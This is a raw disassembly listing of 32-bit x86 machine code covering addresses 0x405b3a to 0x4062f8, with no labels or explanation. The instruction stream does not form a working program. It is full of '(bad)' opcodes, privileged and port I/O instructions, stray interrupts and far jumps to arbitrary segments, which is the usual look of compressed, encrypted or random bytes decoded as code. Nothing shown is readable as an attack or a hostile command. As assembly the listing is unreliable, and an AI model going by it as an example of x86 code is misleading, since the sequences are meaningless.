  405b3a:	clc    
  405b3b:	pop    edx
  405b3c:	mov    dh,BYTE PTR [edi]
  405b3e:	call   0xf701d0cf
  405b43:	mov    eax,ds:0xf0dbd9
  405b48:	xlat   BYTE PTR ds:[ebx]
  405b49:	cwde   
  405b4a:	jp     0x405b22
  405b4c:	gs clc 
  405b4e:	clc    
  405b4f:	mov    esp,0x28014e56
  405b54:	and    eax,0x753b7554
  405b59:	popf   
  405b5a:	(bad)  
  405b5b:	jle    0x405bad
  405b5d:	jne    0x405b72
  405b5f:	es pop ss
  405b61:	pop    eax
  405b62:	push   ds
  405b63:	cwde   
  405b64:	xor    eax,0xf7914584
  405b69:	hlt    
  405b6a:	jb     0x405bd9
  405b6c:	int    0xc7
  405b6e:	shr    DWORD PTR [edi-0x59],cl
  405b71:	pop    DWORD PTR [edi]
  405b73:	push   esi
  405b74:	cmp    edi,DWORD PTR [ebx-0x73d120fa]
  405b7a:	push   0xa03032a0
  405b7f:	sub    ecx,DWORD PTR [edx+0x56]
  405b82:	push   0x10a2c70e
  405b87:	add    al,0x90
  405b89:	xor    al,0x89
  405b8b:	push   edx
  405b8c:	or     al,0xd8
  405b8e:	jmp    0x6876e9bd
  405b93:	mov    ds:0x515c9624,al
  405b98:	into   
  405b99:	test   eax,0x15f1667a
  405b9e:	jne    0x405b43
  405ba0:	aam    0xee
  405ba2:	sbb    ebp,ebx
  405ba4:	nop
  405ba5:	mov    ch,0xb5
  405ba7:	sbb    edi,0xffffffbc
  405baa:	(bad)  
  405bab:	xor    al,0xfc
  405bad:	int3   
  405bae:	sbb    eax,edx
  405bb0:	dec    esi
  405bb1:	xchg   edi,eax
  405bb2:	xchg   esp,eax
  405bb3:	rcl    al,0xa
  405bb6:	icebp  
  405bb7:	int    0x60
  405bb9:	icebp  
  405bba:	cmc    
  405bbb:	cs arpl sp,dx
  405bbe:	jge    0x405c20
  405bc0:	xchg   ecx,eax
  405bc1:	rol    DWORD PTR [eax+0x5bd30997],1
  405bc7:	iret   
  405bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bc9:	push   ecx
  405bca:	(bad)  
  405bcb:	test   BYTE PTR [ebp-0x390112af],0x32
  405bd2:	pop    ds
  405bd3:	or     al,0x28
  405bd5:	inc    ebx
  405bd6:	mov    esi,DWORD PTR [edi]
  405bd8:	inc    esp
  405bd9:	and    edx,DWORD PTR [ecx+0x7ba9da24]
  405bdf:	adc    al,0xea
  405be1:	jle    0x405bf4
  405be3:	sar    DWORD PTR [edi+esi*2+0x7],1
  405be7:	push   esi
  405be8:	fcmovnb st,st(6)
  405bea:	je     0x405c12
  405bec:	cmp    al,0x55
  405bee:	or     eax,0x117e61c4
  405bf3:	dec    ebp
  405bf4:	call   0xc4bc:0xae901d27
  405bfb:	adc    ebp,ebp
  405bfd:	loopne 0x405c50
  405bff:	in     eax,dx
  405c00:	pop    edx
  405c01:	out    0x46,al
  405c03:	xor    eax,0xc22a1ec5
  405c08:	scas   eax,DWORD PTR es:[edi]
  405c09:	mov    al,ds:0x1ceecb49
  405c0e:	add    esi,esi
  405c10:	retf   0x5270
  405c13:	cmp    ebx,esp
  405c15:	out    dx,eax
  405c16:	mov    esi,0xddb0646c
  405c1b:	test   eax,0x6c9f65b
  405c20:	jecxz  0x405be7
  405c22:	mov    DWORD PTR [esi+0x13],0xcfceaa20
  405c29:	pushf  
  405c2a:	ins    DWORD PTR es:[edi],dx
  405c2b:	out    0x22,al
  405c2d:	fstp   DWORD PTR es:[ecx-0x3c]
  405c31:	out    0x4a,eax
  405c33:	sbb    eax,DWORD PTR [ebx+0x29adc132]
  405c39:	add    bl,bh
  405c3b:	(bad)  
  405c3c:	idiv   ebp
  405c3e:	push   0x5cc1013d
  405c43:	jne    0x405cb5
  405c45:	out    0xca,al
  405c47:	xor    al,0x20
  405c49:	mov    ecx,0xe93ec248
  405c4e:	sub    eax,0xdd8753c6
  405c53:	data16 mov ah,0xa2
  405c56:	adc    edi,edi
  405c58:	loope  0x405cce
  405c5a:	xor    eax,0xfa4b542
  405c5f:	pop    es
  405c60:	mov    ecx,0x932f2eeb
  405c65:	push   ebx
  405c66:	pop    ds
  405c67:	adc    eax,0xac7bdcc8
  405c6c:	fisttp WORD PTR [edx]
  405c6e:	mov    bh,BYTE PTR fs:0xd5cb3cb6
  405c75:	cld    
  405c76:	call   0x238f667e
  405c7b:	mov    al,0x9a
  405c7d:	int    0x9b
  405c7f:	leave  
  405c80:	fidiv  WORD PTR [edx+0x64d4ad72]
  405c86:	imul   ebp,DWORD PTR [ebp-0x212140df],0xffffffb4
  405c8d:	pop    ecx
  405c8e:	cdq    
  405c8f:	aam    0x59
  405c91:	or     eax,0xbb30410
  405c96:	fld    DWORD PTR [eax]
  405c98:	mov    ebp,0x649c08fb
  405c9d:	pop    ecx
  405c9e:	adc    bl,BYTE PTR es:[eax-0x2854e283]
  405ca5:	into   
  405ca6:	ss stos DWORD PTR es:[edi],eax
  405ca8:	jne    0x405c3a
  405caa:	push   ds
  405cab:	xor    edx,DWORD PTR [esi]
  405cad:	stos   DWORD PTR es:[edi],eax
  405cae:	rcr    BYTE PTR es:[eax],1
  405cb1:	mov    esp,0x12efe92f
  405cb6:	shl    DWORD PTR [edx-0x43],0x67
  405cba:	mov    esi,0x24d7d364
  405cbf:	fild   QWORD PTR ds:0x21173096
  405cc5:	icebp  
  405cc6:	lahf   
  405cc7:	pmulhw mm3,mm6
  405cca:	push   eax
  405ccb:	call   0x272b:0xaf984cd1
  405cd2:	(bad)
  405cd7:	leave  
  405cd8:	stc    
  405cd9:	xchg   ecx,eax
  405cda:	mov    esp,0x5dfa894d
  405cdf:	adc    esi,DWORD PTR [ebp-0x41]
  405ce2:	(bad)  
  405ce3:	mov    ah,0x3e
  405ce5:	mov    BYTE PTR [esi-0x5],al
  405ce8:	cdq    
  405ce9:	bound  edx,QWORD PTR [edx+0x68]
  405cec:	jno    0x405d2c
  405cee:	fdivp  st(2),st
  405cf0:	xchg   edx,eax
  405cf1:	retf   
  405cf2:	ins    DWORD PTR es:[edi],dx
  405cf3:	in     eax,0xcd
  405cf5:	jnp    0x405cc3
  405cf7:	rcr    BYTE PTR [esi],1
  405cf9:	ins    BYTE PTR es:[edi],dx
  405cfa:	cmp    cl,cl
  405cfc:	adc    BYTE PTR [ebx],ch
  405cfe:	jno    0x405d23
  405d00:	mov    DWORD PTR [ebx],edi
  405d02:	mov    bl,BYTE PTR [ecx+0xbc06d2b]
  405d08:	mov    BYTE PTR [edx],0x42
  405d0b:	in     al,0x32
  405d0d:	not    BYTE PTR ds:0x72c6380c
  405d13:	sub    al,0xe4
  405d15:	mov    bh,BYTE PTR [ebp+ebx*8+0x2f]
  405d19:	inc    edi
  405d1a:	repz mov al,0x39
  405d1d:	loop   0x405ce9
  405d1f:	mov    ebx,0xdbebb551
  405d24:	jmp    DWORD PTR [edi]
  405d26:	pop    DWORD PTR [edi-0x5f0bffa3]
  405d2c:	add    eax,0xa6102c15
  405d31:	mov    ds:0xc3befca4,eax
  405d36:	shl    esi,0xc0
  405d39:	fild   QWORD PTR ss:[esi+0x390a9a40]
  405d40:	test   BYTE PTR [edi],bh
  405d42:	jle    0x405d99
  405d44:	mov    esp,0xfeb2cc60
  405d49:	sub    ebp,DWORD PTR [ebx]
  405d4b:	push   ss
  405d4c:	cld    
  405d4d:	jmp    0xb65c:0xd8ba7ee7
  405d54:	adc    ebx,DWORD PTR [edi+0x275a5314]
  405d5a:	icebp  
  405d5b:	jb     0x405dca
  405d5d:	jmp    0x313b:0xe0799d0
  405d64:	mov    dl,0x39
  405d66:	and    DWORD PTR [ebx+0x3b],edi
  405d69:	jae    0x405d87
  405d6b:	fist   DWORD PTR [edi+0xd2bcd5f]
  405d71:	mov    eax,ds:0x131421e4
  405d76:	dec    esp
  405d77:	mov    DWORD PTR [edx+0x30bbe097],ebx
  405d7d:	hlt    
  405d7e:	and    al,0x75
  405d80:	call   0x4254:0xac686dfd
  405d87:	push   edi
  405d88:	in     al,dx
  405d89:	jbe    0x405d71
  405d8b:	adc    ah,dl
  405d8d:	in     eax,dx
  405d8e:	rol    BYTE PTR [ebx-0x6060df52],0x4a
  405d95:	stos   BYTE PTR es:[edi],al
  405d96:	(bad)  
  405d97:	mov    ds:0x1c09eb05,eax
  405d9c:	sbb    eax,0xecf419a6
  405da1:	pushf  
  405da2:	stc    
  405da3:	push   edx
  405da4:	xor    ecx,ebx
  405da6:	and    DWORD PTR cs:[ecx+edi*4],ebp
  405daa:	sbb    al,0xab
  405dac:	mov    edx,0xa4f4cf1d
  405db1:	sbb    eax,0x205dd1f0
  405db6:	cmp    eax,0xd7b3d4e5
  405dbb:	hlt    
  405dbc:	sub    ch,BYTE PTR [esi]
  405dbe:	scas   al,BYTE PTR es:[edi]
  405dbf:	(bad)  
  405dc0:	loop   0x405d77
  405dc2:	dec    eax
  405dc3:	mov    al,0x9b
  405dc5:	jg     0x405d61
  405dc7:	add    eax,0x9385e645
  405dcc:	stos   BYTE PTR es:[edi],al
  405dcd:	or     bh,BYTE PTR [ebx-0x7746349f]
  405dd3:	jle    0x405e30
  405dd5:	test   al,0x32
  405dd7:	xor    BYTE PTR [ebx+0x59],bh
  405dda:	aas    
  405ddb:	push   ds
  405ddc:	pop    ebx
  405ddd:	scas   al,BYTE PTR es:[edi]
  405dde:	jmp    0x4808:0xe43244ff
  405de5:	or     ch,BYTE PTR [ebx+0x23]
  405de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405de9:	in     eax,dx
  405dea:	(bad)  
  405deb:	mov    edi,0x3601a35d
  405df0:	test   al,0x92
  405df2:	enter  0x4dab,0x60
  405df6:	out    0x42,eax
  405df8:	jg     0x405d83
  405dfa:	mov    al,bl
  405dfc:	in     al,0xe
  405dfe:	sti    
  405dff:	out    dx,eax
  405e00:	mov    edx,0x468c438d
  405e05:	js     0x405e67
  405e07:	int    0xee
  405e09:	in     al,0x6b
  405e0b:	sbb    al,0x1b
  405e0d:	mov    al,ds:0xfff2e8d8
  405e12:	out    dx,eax
  405e13:	loope  0x405e17
  405e15:	fdiv   DWORD PTR [ecx]
  405e17:	clc    
  405e18:	push   ecx
  405e19:	aas    
  405e1a:	and    al,0x19
  405e1c:	int3   
  405e1d:	add    eax,0x8a63c8fc
  405e22:	pushf  
  405e23:	outs   dx,BYTE PTR ds:[esi]
  405e24:	or     al,0xaf
  405e26:	fcomp  DWORD PTR [ecx-0x551b9ef8]
  405e2c:	mov    esp,0x8a2c5307
  405e31:	inc    ecx
  405e32:	jmp    0x405e98
  405e34:	jmp    0x405e9c
  405e36:	and    al,0x63
  405e38:	lods   al,BYTE PTR ds:[esi]
  405e39:	dec    esi
  405e3a:	sahf   
  405e3b:	add    eax,0x2fa5cadf
  405e40:	dec    eax
  405e41:	imul   edx,DWORD PTR [eax+0x2f75aaf2],0x7c
  405e48:	not    DWORD PTR [ecx]
  405e4a:	cs ja  0x405e0f
  405e4d:	popf   
  405e4e:	int3   
  405e4f:	xchg   BYTE PTR [edx-0x72b43a7b],ah
  405e55:	mov    bl,BYTE PTR [edi+0x1e]
  405e58:	push   ebx
  405e59:	push   esp
  405e5a:	aas    
  405e5b:	pop    ss
  405e5c:	pop    edx
  405e5d:	stos   DWORD PTR es:[edi],eax
  405e5e:	in     al,0x55
  405e60:	icebp  
  405e61:	xor    cl,BYTE PTR [ecx-0x5]
  405e64:	xor    DWORD PTR [ecx],ebp
  405e66:	lods   al,BYTE PTR ds:[esi]
  405e67:	and    al,0x3a
  405e69:	fwait
  405e6a:	stc    
  405e6b:	jmp    0xd967:0x225f04be
  405e72:	mov    dl,0x13
  405e74:	xchg   esi,eax
  405e75:	retf   
  405e76:	or     BYTE PTR [eax],dh
  405e78:	mov    ds,edi
  405e7a:	inc    edi
  405e7b:	lock and DWORD PTR [esi+0x3b],ebx
  405e7f:	mov    ah,0x18
  405e81:	push   ebx
  405e82:	pusha  
  405e83:	ret    0x235
  405e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e87:	jle    0x405e31
  405e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e8a:	repz jo 0x405ecc
  405e8d:	and    DWORD PTR [edi+0x33aa02bc],ebx
  405e93:	les    edi,FWORD PTR [edx]
  405e95:	pop    edi
  405e96:	mov    ebx,0xd866f5f
  405e9b:	mov    edx,ss
  405e9d:	sub    al,0x9a
  405e9f:	sub    eax,0x7a73f8ae
  405ea4:	fist   WORD PTR [ecx+0x36]
  405ea7:	adc    al,0xee
  405ea9:	cs jle 0x405e97
  405eac:	jae    0x405e74
  405eae:	(bad)
  405eb1:	push   esi
  405eb2:	repnz push edx
  405eb4:	adc    BYTE PTR ds:0x5b40d78d,ch
  405eba:	push   ecx
  405ebb:	adc    eax,0xea97f147
  405ec0:	dec    esi
  405ec1:	mov    eax,ds:0xba35321f
  405ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ec7:	push   ebp
  405ec8:	mov    ds:0xed129722,al
  405ecd:	dec    edi
  405ece:	xchg   BYTE PTR [esi],cl
  405ed0:	jmp    0x1a39f460
  405ed5:	ja     0x405e6d
  405ed7:	out    0xb9,al
  405ed9:	ret    0xcc35
  405edc:	jmp    0x405ef8
  405ede:	shl    BYTE PTR [ebp-0x33],0x2f
  405ee2:	inc    ecx
  405ee3:	imul   edx,DWORD PTR ds:0x6a940a7,0xffffff8f
  405eea:	cli    
  405eeb:	leave  
  405eec:	lahf   
  405eed:	gs push edi
  405eef:	xchg   esi,eax
  405ef0:	ror    BYTE PTR [edi],cl
  405ef2:	sbb    DWORD PTR [esi+0x31],0x9e13513e
  405ef9:	sub    ah,BYTE PTR [esp+ecx*2-0x12a313c5]
  405f00:	dec    esi
  405f01:	cmp    al,0xbf
  405f03:	cwde   
  405f04:	daa    
  405f05:	sub    BYTE PTR [ecx+0x18],dl
  405f08:	enter  0x2387,0xa8
  405f0c:	cmp    bh,ch
  405f0e:	in     al,0xcc
  405f10:	int    0xe9
  405f12:	loop   0x405f2a
  405f14:	fcomp  DWORD PTR [ebx+0x3b]
  405f17:	popf   
  405f18:	and    DWORD PTR [esi],eax
  405f1a:	sub    DWORD PTR [edi+0xfb93ece],ebp
  405f20:	xchg   esp,eax
  405f21:	mov    al,0x3b
  405f23:	ret    
  405f24:	mov    dh,0x81
  405f26:	sbb    DWORD PTR [eax+0x68],eax
  405f29:	hlt    
  405f2a:	pop    eax
  405f2b:	into   
  405f2c:	test   BYTE PTR [eax-0x31eaedc],dh
  405f32:	adc    BYTE PTR [esi],dh
  405f34:	ins    DWORD PTR es:[edi],dx
  405f35:	pop    es
  405f36:	jb     0x405f24
  405f38:	daa    
  405f39:	mov    ds:0x18fe0ee3,eax
  405f3e:	pop    edx
  405f3f:	lahf   
  405f40:	mov    bh,0xa8
  405f42:	inc    ebp
  405f43:	retf   
  405f44:	xlat   BYTE PTR ds:[ebx]
  405f45:	mov    ss,WORD PTR cs:[esi-0x403f85d2]
  405f4c:	lea    edi,[edi+0x6e]
  405f4f:	mov    ds:0xe2fc5281,eax
  405f54:	cdq    
  405f55:	inc    ecx
  405f56:	inc    esi
  405f57:	ret    
  405f58:	push   ss
  405f59:	daa    
  405f5a:	ja     0x405ef6
  405f5c:	and    dh,dl
  405f5e:	mov    ecx,0x6e285d1f
  405f63:	test   BYTE PTR [edi],0xdc
  405f66:	int3   
  405f67:	inc    ebx
  405f68:	pusha  
  405f69:	xlat   BYTE PTR ds:[ebx]
  405f6a:	fmul   st,st(2)
  405f6c:	jmp    0x5cc9:0x48bcb79d
  405f73:	repz cli 
  405f75:	fs loop 0x405f70
  405f78:	mov    cl,0xaf
  405f7a:	lds    ebp,FWORD PTR [ebx+0x3334433b]
  405f80:	inc    ecx
  405f81:	int3   
  405f82:	out    dx,al
  405f83:	mov    fs,WORD PTR [ebp-0x64]
  405f86:	xchg   ebx,eax
  405f87:	cmp    DWORD PTR [ecx],esp
  405f89:	shr    BYTE PTR ds:0x71924bbe,0xe1
  405f90:	nop
  405f91:	mov    esi,0xa64e7292
  405f96:	pop    eax
  405f97:	xor    ecx,edx
  405f99:	repz add dl,BYTE PTR [eax]
  405f9c:	cld    
  405f9d:	arpl   WORD PTR [eax-0x80],bx
  405fa0:	lea    esi,[esi+0x0]
  405fa3:	mov    DWORD PTR [esi],ecx
  405fa5:	jmp    0x22d5c347
  405faa:	outs   dx,DWORD PTR ds:[esi]
  405fab:	je     0x405f39
  405fad:	jmp    0x43af2ea1
  405fb2:	je     0x405f58
  405fb4:	retf   0x3430
  405fb7:	mov    bl,0xc6
  405fb9:	jne    0x405f48
  405fbb:	imul   esi,DWORD PTR [eax+0x8ed3837],0x20
  405fc2:	fsubr  DWORD PTR [ebp+0x1b]
  405fc5:	mov    bl,0x87
  405fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fc8:	mov    edx,0xf84c80df
  405fcd:	cmp    BYTE PTR [edi-0x5a],0x6f
  405fd1:	aam    0x3d
  405fd3:	add    edx,DWORD PTR [ebx]
  405fd5:	js     0x406002
  405fd7:	and    DWORD PTR [ecx+0x2f],ebx
  405fda:	ss into 
  405fdc:	rcr    DWORD PTR [edx+0x2d9ed38d],cl
  405fe2:	in     eax,dx
  405fe3:	pop    esp
  405fe4:	sbb    ch,ch
  405fe6:	(bad)  
  405fe7:	fcomp  DWORD PTR [ebp-0x13]
  405fea:	jo     0x405fa6
  405fec:	lods   al,BYTE PTR ds:[esi]
  405fed:	mov    bh,0x5f
  405fef:	xchg   ebx,eax
  405ff0:	xor    BYTE PTR [ebx],bl
  405ff2:	mov    bl,0x56
  405ff4:	or     ah,bl
  405ff6:	xor    BYTE PTR [edi+0x7500fe0c],dl
  405ffc:	and    al,0x50
  405ffe:	mov    ebp,0xc73a7a6f
  406003:	std    
  406004:	jecxz  0x405fa9
  406006:	mov    edi,0x5341e5a4
  40600b:	les    ebp,FWORD PTR [eax+0x37488962]
  406011:	or     DWORD PTR [edx+0x6d3b3146],esp
  406017:	mov    ah,0xb8
  406019:	shr    DWORD PTR es:[ebp-0x42],1
  40601d:	es loopne 0x406092
  406020:	mov    DWORD PTR [ebp+0xe3c5656],ebx
  406026:	es mov eax,ss
  406029:	fidiv  WORD PTR [edx+0x646d0207]
  40602f:	sbb    al,0x7e
  406031:	pop    es
  406032:	das    
  406033:	add    DWORD PTR [edi+0x1e],esi
  406036:	lods   eax,DWORD PTR ds:[esi]
  406037:	dec    ebp
  406038:	dec    eax
  406039:	xchg   ebx,eax
  40603a:	mov    ah,BYTE PTR [eax+ebx*4]
  40603d:	iret   
  40603e:	pop    esp
  40603f:	mov    al,ds:0xcfdc0f6
  406044:	push   es
  406045:	pop    ss
  406046:	out    dx,eax
  406047:	pop    edx
  406048:	arpl   ax,dx
  40604a:	pop    edi
  40604b:	inc    eax
  40604c:	jp     0x406048
  40604e:	dec    ebp
  40604f:	jmp    0x405fdd
  406051:	test   al,0x56
  406053:	mov    al,gs:0x131cc7c8
  406059:	clc    
  40605a:	in     eax,dx
  40605b:	es aam 0x1a
  40605e:	in     eax,0x18
  406060:	out    0xc9,al
  406062:	test   DWORD PTR [ebp+0x48846670],edx
  406068:	push   es
  406069:	add    DWORD PTR [edx-0x5b],edi
  40606c:	xlat   BYTE PTR ds:[ebx]
  40606d:	pop    esi
  40606e:	popa   
  40606f:	mov    ds:0xb94da9d9,eax
  406074:	pop    ds
  406075:	sub    cl,BYTE PTR [ecx-0x56d57979]
  40607b:	arpl   cx,sp
  40607d:	inc    esp
  40607e:	push   ds
  40607f:	push   es
  406080:	(bad)  
  406081:	adc    dh,bh
  406083:	mov    ecx,0x203875db
  406088:	inc    edi
  406089:	pop    esp
  40608a:	iret   
  40608b:	nop
  40608c:	xchg   BYTE PTR [esi+0x57854ad],al
  406092:	(bad)  
  406093:	xchg   ecx,eax
  406094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406095:	in     al,dx
  406096:	mov    al,ds:0x8960619b
  40609b:	lahf   
  40609c:	in     eax,dx
  40609d:	pop    eax
  40609e:	(bad)  
  40609f:	and    al,0x73
  4060a1:	xor    ah,BYTE PTR [ecx+esi*2]
  4060a4:	cmp    BYTE PTR [eax+0x2],bl
  4060a7:	xchg   esp,eax
  4060a8:	adc    BYTE PTR [ebx],0x8b
  4060ab:	xor    BYTE PTR [esi-0x43bb9ffc],dl
  4060b1:	fcomi  st,st(5)
  4060b3:	add    DWORD PTR [edx-0x18],ebx
  4060b6:	push   ecx
  4060b7:	nop
  4060b8:	repz mov ds:0x4d3899d,al
  4060be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060bf:	and    DWORD PTR [eax],ebp
  4060c1:	rol    DWORD PTR [ebx+0x5af9a3db],cl
  4060c7:	jecxz  0x40608c
  4060c9:	lds    esi,FWORD PTR [edi+esi*8-0x15]
  4060cd:	stos   BYTE PTR es:[edi],al
  4060ce:	(bad)
  4060d3:	xor    eax,0xe2de57c4
  4060d8:	ja     0x4060d0
  4060da:	jnp    0x406137
  4060dc:	clc    
  4060dd:	into   
  4060de:	add    eax,0xac4b2e46
  4060e3:	rol    esp,1
  4060e5:	pop    ebp
  4060e6:	fmul   DWORD PTR [edi-0x1bf0d261]
  4060ec:	in     al,dx
  4060ed:	pop    esp
  4060ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060ef:	jae    0x406095
  4060f1:	xchg   ecx,eax
  4060f2:	inc    ebx
  4060f3:	pop    esp
  4060f4:	(bad)  
  4060f5:	test   eax,0xae9bd76d
  4060fa:	mov    ch,0xc9
  4060fc:	add    DWORD PTR [ebx+0x176e38d6],esi
  406102:	mov    dh,0xbe
  406104:	cwde   
  406105:	pop    esp
  406106:	sbb    cl,cl
  406108:	cmc    
  406109:	xchg   ebp,eax
  40610a:	add    BYTE PTR ds:0xc8b6be62,cl
  406110:	rcl    BYTE PTR [edx+0x22],cl
  406113:	repnz lock dec esp
  406116:	aaa    
  406117:	xor    DWORD PTR [eax-0x4a5d7ad6],esp
  40611d:	std    
  40611e:	popa   
  40611f:	mov    esi,ebx
  406121:	or     BYTE PTR [edx],cl
  406123:	mov    esp,0x440612ef
  406128:	mov    cl,0x68
  40612a:	pop    es
  40612b:	in     eax,0x46
  40612d:	inc    ah
  40612f:	loop   0x406165
  406131:	jns    0x4060f4
  406133:	clc    
  406134:	xlat   BYTE PTR ds:[ebx]
  406135:	ds dec ebx
  406137:	sub    BYTE PTR [edi+0x29],cl
  40613a:	mov    ch,0xfa
  40613c:	(bad)  
  40613d:	sti    
  40613e:	jg     0x406120
  406140:	dec    BYTE PTR [ebp-0x7e0b059b]
  406146:	xor    eax,0x841f4c0b
  40614b:	xchg   ah,ch
  40614d:	scas   eax,DWORD PTR es:[edi]
  40614e:	or     dl,BYTE PTR [edi]
  406150:	je     0x4061c4
  406152:	lea    ebp,[edi+ecx*8]
  406155:	rcr    BYTE PTR [edi+0x5b],cl
  406158:	stos   DWORD PTR es:[edi],eax
  406159:	aad    0x9a
  40615b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40615c:	(bad)  
  40615d:	and    DWORD PTR [edi+0x78],eax
  406160:	sti    
  406161:	lea    ebx,[eax-0xc]
  406164:	mov    eax,0xd3f404cf
  406169:	mov    ebp,0x1c4f0e0c
  40616e:	out    0x7a,eax
  406170:	push   edx
  406171:	out    0xde,al
  406173:	xor    dl,BYTE PTR [edi]
  406175:	call   0xcb74:0x3681a475
  40617c:	ss icebp 
  40617e:	inc    esp
  40617f:	fidiv  WORD PTR [edx+0x54]
  406182:	dec    eax
  406183:	ins    BYTE PTR es:[edi],dx
  406184:	in     al,dx
  406185:	ret    0xf9f8
  406188:	xor    esi,edi
  40618a:	mov    DWORD PTR [edi+0x28],ebp
  40618d:	sub    DWORD PTR [ebx-0x7d],eax
  406190:	dec    edx
  406191:	push   cs
  406192:	ins    DWORD PTR es:[di],dx
  406194:	mov    edi,0x4ab652ef
  406199:	xor    dl,ah
  40619b:	adc    eax,esi
  40619d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40619e:	out    0x4a,al
  4061a0:	inc    edx
  4061a1:	adc    DWORD PTR [edx+0x6f02d6fa],ecx
  4061a7:	push   ebp
  4061a8:	and    esi,esi
  4061aa:	mov    DWORD PTR [esi-0x4e],esp
  4061ad:	push   ecx
  4061ae:	fwait
  4061af:	and    bl,cl
  4061b1:	xchg   edi,eax
  4061b2:	dec    esp
  4061b3:	jbe    0x4061cd
  4061b5:	push   esi
  4061b6:	aam    0x37
  4061b8:	push   cs
  4061b9:	stos   BYTE PTR es:[edi],al
  4061ba:	(bad)  
  4061bc:	mov    BYTE PTR [eax+0x5c66dd68],ah
  4061c2:	sar    DWORD PTR [edx],cl
  4061c4:	stos   BYTE PTR es:[edi],al
  4061c5:	push   esi
  4061c6:	inc    eax
  4061c7:	jne    0x406225
  4061c9:	jecxz  0x406192
  4061cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061cc:	inc    esp
  4061cd:	xor    al,0x93
  4061cf:	dec    edx
  4061d0:	mov    bh,BYTE PTR [esi+ecx*1]
  4061d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061d4:	cmp    BYTE PTR [ecx+0x35],0xb3
  4061d8:	pop    esp
  4061d9:	int3   
  4061da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061db:	test   al,0xc7
  4061dd:	or     dl,BYTE PTR [ebx+ecx*4-0x3a9c5ef9]
  4061e4:	cmp    al,0x2f
  4061e6:	pop    esi
  4061e7:	aaa    
  4061e8:	(bad)  
  4061e9:	loopne 0x406180
  4061eb:	mov    esp,0x24a724ec
  4061f0:	into   
  4061f1:	dec    ecx
  4061f2:	leave  
  4061f3:	jae    0x40626f
  4061f5:	xchg   ebx,eax
  4061f6:	jbe    0x406184
  4061f8:	(bad)  
  4061f9:	adc    eax,0xcfc13f04
  4061fe:	xchg   esi,eax
  4061ff:	outs   dx,BYTE PTR ds:[esi]
  406200:	shr    DWORD PTR [esi],1
  406202:	je     0x406207
  406204:	sub    BYTE PTR [eax+0x54a5982b],0xe5
  40620b:	mov    cl,0x5e
  40620d:	dec    edx
  40620e:	adc    edi,DWORD PTR [esi+esi*2-0x2e]
  406212:	ret    0xec47
  406215:	mov    bl,0x8d
  406217:	inc    edi
  406218:	and    DWORD PTR [ebp*4-0x6bf22922],eax
  40621f:	pusha  
  406220:	mov    ebx,DWORD PTR [ecx+edx*4-0x60e398ce]
  406227:	and    ch,BYTE PTR [esi]
  406229:	sbb    DWORD PTR [esi+0x4d],0x42031fee
  406230:	xchg   edi,eax
  406231:	test   ah,bl
  406233:	out    dx,eax
  406234:	ss pop edx
  406236:	shl    DWORD PTR [esi-0x27da02bd],0x59
  40623d:	pop    ss
  40623e:	(bad)  
  40623f:	jecxz  0x406293
  406241:	in     al,0x12
  406243:	call   0x9a97:0xdde9473c
  40624a:	mov    al,0x2a
  40624c:	cmc    
  40624d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40624e:	push   ss
  40624f:	stc    
  406250:	mov    ch,0x2
  406252:	aaa    
  406253:	jecxz  0x4061d9
  406255:	shr    dh,0x9b
  406258:	int    0x4c
  40625a:	cmp    edx,ebx
  40625c:	xchg   edx,eax
  40625d:	sbb    ah,bl
  40625f:	push   ebx
  406260:	cmp    dl,bl
  406262:	mov    ecx,0x97dbf9a8
  406267:	add    DWORD PTR [ecx],ecx
  406269:	add    BYTE PTR [eax],0x42
  40626c:	fs stos BYTE PTR es:[edi],al
  40626e:	mov    BYTE PTR [eax],ch
  406270:	inc    ecx
  406272:	push   esi
  406273:	add    BYTE PTR [edi+0x23],dh
  406276:	mov    eax,ebp
  406278:	push   ss
  406279:	and    DWORD PTR [esi+0xc1373fe],edx
  40627f:	sbb    esi,DWORD PTR [edi-0x1102d3a]
  406285:	pusha  
  406286:	icebp  
  406287:	gs mov edi,0xdcd3ab44
  40628d:	add    eax,0x755bd926
  406292:	test   al,0x7a
  406294:	mov    edx,0x762dfeb7
  406299:	pop    edi
  40629a:	ss jge 0x406278
  40629d:	jl     0x4062af
  40629f:	pop    ecx
  4062a0:	jg     0x4062b3
  4062a2:	in     al,dx
  4062a3:	dec    esi
  4062a4:	jle    0x4062c4
  4062a6:	xchg   esi,eax
  4062a7:	push   ebx
  4062a8:	jne    0x4062be
  4062aa:	sub    DWORD PTR fs:[esi-0x3b9af314],0x88c9f58
  4062b5:	shl    DWORD PTR [edi],0xf6
  4062b8:	aam    0x8a
  4062ba:	or     ecx,0x6a9f0860
  4062c0:	adc    ebx,eax
  4062c2:	dec    esi
  4062c3:	and    eax,0x37032be7
  4062c8:	mov    ah,0x7c
  4062ca:	cmp    esp,DWORD PTR [ebp-0x16604ed5]
  4062d0:	xlat   BYTE PTR ds:[ebx]
  4062d1:	add    BYTE PTR [ecx+edi*4-0x56],0x37
  4062d6:	mov    bl,0xf5
  4062d8:	mov    dh,0x4e
  4062da:	sub    al,0x83
  4062dc:	or     dl,BYTE PTR [ebx]
  4062de:	ss or  bh,0xe3
  4062e2:	js     0x406311
  4062e4:	dec    edi
  4062e5:	stos   DWORD PTR es:[edi],eax
  4062e6:	scas   eax,DWORD PTR es:[edi]
  4062e7:	sti    
  4062e8:	dec    ebx
  4062e9:	cmc    
  4062ea:	pop    ecx
  4062eb:	(bad)  
  4062ec:	pop    edx
  4062ee:	outs   dx,DWORD PTR ds:[esi]
  4062ef:	mov    edx,0x68b3742e
  4062f4:	call   FWORD PTR [ecx+ebx*1]
  4062f7:	pop    esi
  4062f8:	jg     0x4062d0
